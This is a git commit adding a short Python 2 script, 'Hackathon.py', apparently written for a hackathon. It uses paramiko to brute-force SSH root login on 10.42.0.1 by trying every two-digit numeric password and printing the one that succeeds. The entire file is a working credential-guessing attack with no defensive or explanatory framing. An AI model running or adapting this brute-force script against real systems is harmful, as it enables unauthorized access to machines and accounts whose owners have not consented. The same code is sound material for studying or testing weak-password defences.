7d79f001cb72c9c34e4f7ee321e7f378e8c79b23
Spockuto <venkythesupersaiyan@gmail.com>
2015-07-27 02:27:02 +0530

    New

---
+++ Hackathon.py
@@ -0,0 +1,18 @@
+#!/usr/bin/env python
+import itertools
+import paramiko
+string='0123456789'
+var = itertools.imap("".join,itertools.product(string,repeat=2))
+
+for i in var:
+	ssh=paramiko.SSHClient()
+	ssh.load_system_host_keys()
+	ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
+	try:
+		print i
+		ssh.connect('10.42.0.1',port=22,username='root',password=i)
+		print "Connection pass. Password= "+i
+	except paramiko.AuthenticationException, error:
+		continue
+	ssh.close()
+
